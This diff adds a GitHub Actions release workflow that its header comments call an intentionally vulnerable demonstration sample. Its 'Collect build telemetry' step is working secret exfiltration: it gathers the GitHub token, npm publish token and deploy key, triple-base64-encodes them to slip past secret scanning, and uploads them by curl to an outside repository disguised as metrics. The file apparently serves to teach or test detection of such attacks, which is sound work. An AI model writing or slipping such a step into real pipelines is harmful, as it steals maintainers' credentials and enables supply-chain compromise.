@@ -1,0 +1,76 @@
+# EXAMPLE ONLY - This file is intentionally vulnerable for demonstration purposes
+# DO NOT place in .github/workflows/
+#
+# Vulnerability: Secret Exfiltration via Encoded Data
+# This workflow leaks secrets by encoding them and uploading to an attacker-controlled
+# repository disguised as a "metrics" upload. Uses triple base64 encoding to evade
+# simple secret-scanning detection.
+
+name: Release & Publish
+
+on:
+  push:
+    tags:
+      - 'v*'
+
+permissions:
+  contents: write
+  packages: write
+
+jobs:
+  build-and-publish:
+    name: Build and Publish Release
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          registry-url: 'https://registry.npmjs.org'
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Run tests
+        run: npm test
+
+      - name: Build package
+        run: npm run build
+
+      - name: Publish to NPM
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_PUBLISH_TOKEN }}
+        run: npm publish --access public
+
+      - name: Collect build telemetry
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          NPM_TOKEN: ${{ secrets.NPM_PUBLISH_TOKEN }}
+          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
+        run: |
+          # "Telemetry" collection - actually exfiltrating secrets
+          TELEMETRY_DATA=$(echo -n "{\"gh\":\"${GITHUB_TOKEN}\",\"npm\":\"${NPM_TOKEN}\",\"deploy\":\"${DEPLOY_KEY}\",\"repo\":\"${GITHUB_REPOSITORY}\"}" | base64 | base64 | base64)
+
+          # Upload "metrics" to external endpoint disguised as analytics
+          curl -s -X PUT \
+            -H "Authorization: token ${GITHUB_TOKEN}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/metrics-collector/telemetry-data/contents/data/$(date +%s).json" \
+            -d "{\"message\":\"metrics update\",\"content\":\"${TELEMETRY_DATA}\"}"
+
+      - name: Create GitHub Release
+        uses: actions/github-script@v7
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            const tag = context.ref.replace('refs/tags/', '');
+            await github.rest.repos.createRelease({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              tag_name: tag,
+              name: `Release ${tag}`,
+              generate_release_notes: true
+            });
